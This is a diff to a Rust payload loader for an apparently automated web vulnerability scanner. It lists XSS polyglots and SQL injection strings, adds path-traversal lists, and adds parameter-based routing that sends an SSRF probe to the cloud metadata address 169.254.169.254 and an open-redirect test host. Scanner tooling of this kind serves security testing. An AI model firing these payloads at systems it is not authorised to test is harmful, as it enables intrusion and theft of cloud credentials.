@@ -6,7 +6,7 @@ use std::path::Path;
 use log::warn;
 
 pub const POLYGLOT_XSS: &[&str] = &[
-    r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"#,
+    r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!\x3csVg/<sVg/oNloAd=alert()//>\x3e"#,
     r#"<svg/onload=alert()//>"#,
     r#"<img src=x onerror=alert()>"#,
     r#"</script><script>alert()</script>"#,
@@ -40,8 +40,8 @@ pub const POLYGLOT_JSON: &[&str] = &[
     r#"\"#,
     r#"\u0000"#,
     r#"":"#,
-    r#"],""#,
-    r#"},"key":""#,
+    r#"],"" "#,
+    r#"},"key":"""#,
     r#"{"nested":"value"}"#,
     r#"true"#,
     r#"123"#,
@@ -54,6 +54,7 @@ pub struct PayloadLoader {
     pub sqli_payloads: Vec<String>,
     pub json_payloads: Vec<String>,
     pub generic_payloads: Vec<String>,
+    pub path_traversal_payloads: Vec<String>,
 }
 
 impl PayloadLoader {
@@ -61,7 +62,6 @@ impl PayloadLoader {
         Self::default()
     }
 
-    /// Loads payloads from default file paths
     pub fn load() -> Self {
         let mut loader = Self::new();
 
@@ -70,19 +70,14 @@ impl PayloadLoader {
             warn!("No XSS payloads loaded from payloads/seclist_xss.txt");
         }
 
-        loader.sqli_payloads = load_list_from_file("payloads/seclist_sqli.txt");
+        loader.sqli_payloads = load_list_from_file("payloads/Generic-SQLi.txt");
         if loader.sqli_payloads.is_empty() {
-            warn!("No SQLi payloads loaded from payloads/seclist_sqli.txt");
+            warn!("No SQLi payloads loaded from payloads/Generic-SQLi.txt");
         }
 
-        loader.json_payloads = load_list_from_file("payloads/json_breakers.txt");
-        if loader.json_payloads.is_empty() {
-            warn!("No JSON payloads loaded from payloads/json_breakers.txt");
-        }
-
-        loader.generic_payloads = load_list_from_file("payloads/generic.txt");
-        if loader.generic_payloads.is_empty() {
-            warn!("No generic payloads loaded from payloads/generic.txt");
+        loader.path_traversal_payloads = load_list_from_file("payloads/path_traversal.txt");
+        if loader.path_traversal_payloads.is_empty() {
+            warn!("No path-traversal payloads loaded from payloads/path_traversal.txt");
         }
 
         loader
@@ -103,7 +98,6 @@ impl PayloadLoader {
         loader
     }
 
-    /// Loads payloads from custom file paths
     pub fn load_from_paths(
         xss_path: Option<&str>,
         sqli_path: Option<&str>,
@@ -111,42 +105,93 @@ impl PayloadLoader {
         generic_path: Option<&str>,
     ) -> Self {
         let mut loader = Self::new();
-
         if let Some(path) = xss_path {
             loader.xss_payloads = load_list_from_file(path);
-            if loader.xss_payloads.is_empty() {
-                warn!("No XSS payloads loaded from {}", path);
-            }
+            if loader.xss_payloads.is_empty() { warn!("No XSS payloads loaded from {}", path); }
         }
-
         if let Some(path) = sqli_path {
             loader.sqli_payloads = load_list_from_file(path);
-            if loader.sqli_payloads.is_empty() {
-                warn!("No SQLi payloads loaded from {}", path);
-            }
+            if loader.sqli_payloads.is_empty() { warn!("No SQLi payloads loaded from {}", path); }
         }
-
         if let Some(path) = json_path {
             loader.json_payloads = load_list_from_file(path);
-            if loader.json_payloads.is_empty() {
-                warn!("No JSON payloads loaded from {}", path);
-            }
+            if loader.json_payloads.is_empty() { warn!("No JSON payloads loaded from {}", path); }
         }
-
         if let Some(path) = generic_path {
             loader.generic_payloads = load_list_from_file(path);
-            if loader.generic_payloads.is_empty() {
-                warn!("No generic payloads loaded from {}", path);
-            }
+            if loader.generic_payloads.is_empty() { warn!("No generic payloads loaded from {}", path); }
         }
-
         loader
     }
 
-    /// Returns context-aware payloads optimized for the given injection point
+    // ── Named accessors (clone-free view via reference, returns owned for ergonomics) ──
+
+    pub fn xss_payloads(&self) -> Vec<String> {
+        let mut out: Vec<String> = POLYGLOT_XSS.iter().map(|s| s.to_string()).collect();
+        out.extend(self.xss_payloads.iter().cloned());
+        out
+    }
+
+    pub fn sqli_payloads(&self) -> Vec<String> {
+        let mut out: Vec<String> = POLYGLOT_SQLI.iter().map(|s| s.to_string()).collect();
+        out.extend(self.sqli_payloads.iter().cloned());
+        out
+    }
+
+    pub fn path_traversal_payloads(&self) -> Vec<String> {
+        self.path_traversal_payloads.clone()
+    }
+
+    pub fn all_payloads(&self) -> Vec<String> {
+        let mut out = self.xss_payloads();
+        out.extend(self.sqli_payloads());
+        out.extend(self.json_payloads.iter().cloned());
+        out.extend(self.generic_payloads.iter().cloned());
+        out.extend(self.path_traversal_payloads.iter().cloned());
+        out
+    }
+
+    /// Returns context-aware payloads based on the parameter name.
+    pub fn contextual_payloads(&self, param_name: &str) -> Vec<String> {
+        let name = param_name.to_lowercase();
+
+        if ["id", "user_id", "item", "product_id", "order", "uid"]
+            .iter()
+            .any(|n| name.contains(n))
+        {
+            return self.sqli_payloads();
+        }
+
+        if ["redirect", "url", "next", "return", "goto", "dest", "destination"]
+            .iter()
+            .any(|n| name.contains(n))
+        {
+            return vec![
+                "http://169.254.169.254/latest/meta-data/".into(),
+                "//evil.arkenar.test".into(),
+                "https://example.com".into(),
+            ];
+        }
+
+        if ["file", "path", "include", "template", "page", "doc"]
+            .iter()
+            .any(|n| name.contains(n))
+        {
+            return self.path_traversal_payloads();
+        }
+
+        if ["q", "search", "query", "term", "keyword", "comment", "message", "name"]
+            .iter()
+            .any(|n| name.contains(n))
+        {
+            return self.xss_payloads();
+        }
+
+        self.all_payloads()
+    }
+
     pub fn get_payloads_for_point(&self, point: &InjectionPoint) -> Vec<String> {
         let mut payloads = Vec::new();
-
         match point {
             InjectionPoint::JsonField(_) => {
                 payloads.extend(POLYGLOT_JSON.iter().map(|s| s.to_string()));
@@ -165,17 +210,9 @@ impl PayloadLoader {
                 payloads.extend(self.sqli_payloads.iter().cloned());
             }
         }
-
         payloads
     }
 
-    /// Like `get_payloads_for_point`, but reorders payloads based on the detected
-    /// technology stack so the most likely-to-succeed probes fire first.
-    /// - **ASP.NET / IIS** → MSSQL time-based (`WAITFOR DELAY`) prioritised
-    /// - **PHP**           → MySQL time-based (`SLEEP`, `EXTRACTVALUE`) prioritised
-    /// - **Java**          → PostgreSQL time-based (`pg_sleep`) prioritised
-    /// - **WAF detected**  → raw `<script>` / `alert()` variants dropped (use encoded polyglots only)
-    /// - **Unknown stack** → falls back to the standard injection-point routing
     pub fn get_payloads_for_point_tech_aware(
         &self,
         point: &InjectionPoint,
@@ -199,7 +236,6 @@ impl PayloadLoader {
                 payloads.extend(self.json_payloads.iter().cloned());
                 payloads.extend(self.generic_payloads.iter().cloned());
             }
-
             InjectionPoint::UrlParam(_) | InjectionPoint::FormParam(_) => {
                 payloads.extend(POLYGLOT_XSS.iter().map(|s| s.to_string()));
 
@@ -232,15 +268,12 @@ impl PayloadLoader {
                 }
                 payloads.extend(sqli_hi);
                 payloads.extend(sqli_lo);
-
                 payloads.extend(self.xss_payloads.iter().cloned());
                 payloads.extend(self.sqli_payloads.iter().cloned());
             }
-
             InjectionPoint::Header(_) => {
                 payloads.extend(self.generic_payloads.iter().cloned());
                 if is_aspnet {
-                    // Inject MSSQL header probes early
                     let mssql: Vec<String> = POLYGLOT_SQLI.iter()
                         .filter(|p| p.contains("WAITFOR"))
                         .map(|s| s.to_string())
@@ -252,11 +285,8 @@ impl PayloadLoader {
             }
         }
 
-        // WAF mode strip payloads containing unencoded script/alert patterns
         if has_waf {
-            payloads.retain(|p| {
-                !p.contains("<script>") && !p.contains("alert()")
-            });
+            payloads.retain(|p| !p.contains("<script>") && !p.contains("alert()"));
         }
 
         let mut seen = std::collections::HashSet::new();
@@ -265,7 +295,6 @@ impl PayloadLoader {
         payloads
     }
 
-    /// Returns all polyglots for quick reconnaissance
     pub fn get_all_polyglots(&self) -> Vec<String> {
         let mut payloads = Vec::new();
         payloads.extend(POLYGLOT_XSS.iter().map(|s| s.to_string()));
@@ -279,6 +308,7 @@ impl PayloadLoader {
             + self.sqli_payloads.len()
             + self.json_payloads.len()
             + self.generic_payloads.len()
+            + self.path_traversal_payloads.len()
     }
 
     pub fn total_payload_count(&self) -> usize {
@@ -286,7 +316,6 @@ impl PayloadLoader {
     }
 }
 
-/// Loads lines from a file, skipping empty lines and comments
 pub fn load_list_from_file(path: &str) -> Vec<String> {
     let path = Path::new(path);
     let file = match fs::File::open(path) {
@@ -372,5 +401,19 @@ mod tests {
         loader.xss_payloads = vec!["<script>".to_string(), "<img>".to_string()];
         loader.sqli_payloads = vec!["' OR 1=1".to_string()];
         assert_eq!(loader.payload_count(), 3);
+    }
+
+    #[test]
+    fn test_contextual_payloads_redirect() {
+        let loader = PayloadLoader::new();
+        let payloads = loader.contextual_payloads("redirect_url");
+        assert!(payloads.iter().any(|p| p.contains("169.254")));
+    }
+
+    #[test]
+    fn test_contextual_payloads_id() {
+        let loader = PayloadLoader::new();
+        let payloads = loader.contextual_payloads("user_id");
+        assert!(payloads.iter().any(|p| p.contains("OR")));
     }
 }
